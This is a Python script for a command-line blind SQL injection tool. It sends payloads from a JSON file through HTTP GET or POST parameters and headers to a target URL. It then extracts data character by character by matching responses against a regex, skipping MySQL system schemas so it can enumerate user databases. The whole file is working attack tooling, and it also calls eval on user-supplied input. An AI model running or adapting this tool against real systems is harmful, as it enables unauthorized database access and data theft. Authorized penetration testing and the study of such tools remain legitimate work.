import cli_options
import json
import re
import requests
from urllib.parse import quote_plus as urlencode

NOTIN_PLACEHOLDER = 'NOTIN'
PLACEHOLDER = '{}'

chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
notin = ['information_schema', 'mysql', 'performance_schema', 'sys']
verbose = False

cli = cli_options.CliOptions()


def substitute_placeholders(query, placeholder, notin):
    notinString = ','.join([("'" + name + "'") for name in notin])
    query = re.sub(placeholder, notinString, query)

    return query


def in_POST_request(payload, url, headers):
    r = requests.post(url, data=payload, headers=headers)
    return (r.text, r.status_code)


def in_GET_request(payload, url, headers):
    r = requests.get(url, params=payload, headers=headers)
    return (r.text, r.status_code)


def prepare_payload(parameters, phrase, encode):
    payload = {}

    for param in parameters:

        if (re.search(PLACEHOLDER, param[1])):

            newParam = phrase.format(param[1])

        else:
            newParam = param[1]

        payload[param[0]] = urlencode(newParam) if encode == True else newParam

    return payload


def not_bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode):

    payload = prepare_payload(parameters, sql_query, encode)
    headers = prepare_payload(headers, sql_query, encode)
    r, status = callback(payload, url, headers)
    if verbose: print('[Response body] {}'.format(cli.grey(r)))
    if verbose: print("[Http status] {}".format(cli.status(status)))

    result = pattern.search(r)

    if (positive and result) or (not positive and not result):
        message = '[Found] {}'.format(r)
        print(cli.green(message))


def bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode, word=''):

    try:

        for char in chars:

            new_word = word + char
            brutequery = sql_query.format(new_word)
            if verbose: print('[Payload] {}'.format(cli.grey(brutequery)))

            payload = prepare_payload(parameters, brutequery, encode)
            new_headers = prepare_payload(headers, brutequery, encode)

            r, status = callback(payload, url, new_headers)
            if verbose: print('[Response body] {}'.format(cli.grey(r)))
            if verbose: print("[Http status] {}".format(cli.status(status)))

            result = pattern.search(r)

            if (positive and result) or (not positive and not result):
                    return bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode, new_word)

        message = cli.green('[Found] {}'.format(word)) if word is not '' else cli.red('[Nothing found] :(')
        print(message)
        return word

    except KeyboardInterrupt:
        print(cli.red('\n[Script exit]'))


def parse_parameters(params, delimiter):
    paramsAsList = []
    if params:
        for param in params:
            paramsAsList.append([p.strip() for p in param.split(delimiter)])
    return paramsAsList


def run_injection(method, parameters, headers, sql_query_set, url, pattern, positive, encode):
    try:
        if type(sql_query_set) is list:
            for phrase in sql_query_set:
                run_with_callback(method, parameters, headers, phrase, url, pattern, positive, encode)

        elif type(sql_query_set) is str:
            run_with_callback(method, parameters, headers, sql_query_set, url, pattern, positive, encode)

    except KeyboardInterrupt:
        print(cli.red('\n[Script exit]'))

    except:
        print('''
            Something went wrong. Possible causes:
            1. Wrong regexp pattern
            2. Negative search pattern is actually positive search pattern
            3. You forgot about some important header
            4. There is more than one placeholder in query
            ''')


def run_with_callback(method, parameters, headers, sql_query, url, pattern, positive, encode):

    if not re.search(PLACEHOLDER, sql_query):
        func = not_bruteforce

    else:
        func = bruteforce

    sql_query = substitute_placeholders(sql_query, NOTIN_PLACEHOLDER, notin)
    sql_query = sql_query.rstrip('\n')
    print(cli.yellow('\n[Testing] {}'.format(sql_query)))

    if method == 'POST':
        func(parameters, headers, sql_query, url, in_POST_request, pattern, positive, encode)

    elif method == 'GET':
        func(parameters, headers, sql_query, url, in_GET_request, pattern, positive, encode)




if __name__ == "__main__":

    args = cli.parse_arguments()
    
    json_parsed = json.load(args.filename)
    query_set = eval('json_parsed'+args.query_set)

    headers = parse_parameters(args.http_header, ':')
    parameters = parse_parameters(args.parameter, '=')
    verbose = args.verbose

    run_injection(args.http_method, parameters, headers, query_set, args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
